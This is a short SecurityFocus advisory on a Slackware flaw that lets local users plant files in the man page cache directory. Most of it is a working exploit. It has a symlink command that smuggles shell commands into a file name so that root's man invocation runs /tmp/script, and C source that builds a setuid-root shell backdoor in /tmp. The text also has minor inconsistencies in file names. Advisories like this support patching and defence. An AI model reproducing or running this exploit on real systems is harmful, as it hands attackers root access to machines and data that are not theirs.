source: http://www.securityfocus.com/bid/3054/info

Slackware Linux contains a configuration error that enables local users to create files in the directory used by the system manual pager ('man') for cache files.

Due to the behaviour of the 'man' program, it may be possible for an attacker to create a malicious cache file causing the execution of arbitrary code when another user views a manual page corresponding to that cache file. 

ln -s "/usr/man/man7/man.7.gz;cd;cd ..;cd ..;cd ..;cd ..;cd tmp;export PATH=.;script;man.7" /var/man/cat7/man.7.gz

When `/usr/bin/man man` is executed by root, it will create
/var/man/cat7/man.1.gz. The symlink forces it to create a file in /usr/man/man7 named:
"/usr/man/man7/man.7.gz;cd;cd ..;cd ..;cd ..;cd ..;cd tmp;exportPATH=.;script;man.7.gz."

/usr/bin/man will then execute /tmp/script which contains:

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <errno.h>

int main()
{
FILE *fil;
mode_t perm = 06711;

if(!getuid()) {
fil = fopen("/tmp/bleh.c","w");
fprintf(fil,"%s\n","#include <unistd.h>");
fprintf(fil,"%s\n","#include <stdio.h>");
fprintf(fil,"%s\n","int main() {");
fprintf(fil,"%s\n","setreuid(0,0);setregid(0,0);");
fprintf(fil,"%s\n","execl(\"/bin/su\",\"su\",NULL);");
fprintf(fil,"%s\n","return 0; }");
fclose(fil);
system("/usr/bin/gcc -o /tmp/bleh /tmp/bleh.c");
unlink("/tmp/bleh.c");
chmod("/tmp/bleh", perm);
}
execl("/usr/bin/man","man","/usr/man/man7/man.7.gz",NULL);
return 0;
} 